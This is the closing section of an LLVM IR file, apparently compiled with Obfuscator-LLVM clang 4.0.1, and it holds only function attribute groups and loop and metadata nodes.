attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind readnone }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{i32 -2146537462}
!5 = !{!6}
!6 = distinct !{!6, !7}
!7 = distinct !{!7, !"LVerDomain"}
!8 = !{!9}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !11}
!11 = !{!"llvm.loop.unroll.disable"}
!12 = distinct !{!12, !2, !3}
!13 = distinct !{!13, !2, !3}
!14 = !{i32 -2146536334}
!15 = !{i32 -2146534894}
!16 = distinct !{!16, !2, !3}
!17 = distinct !{!17, !18, !2, !3}
!18 = !{!"llvm.loop.unroll.runtime.disable"}
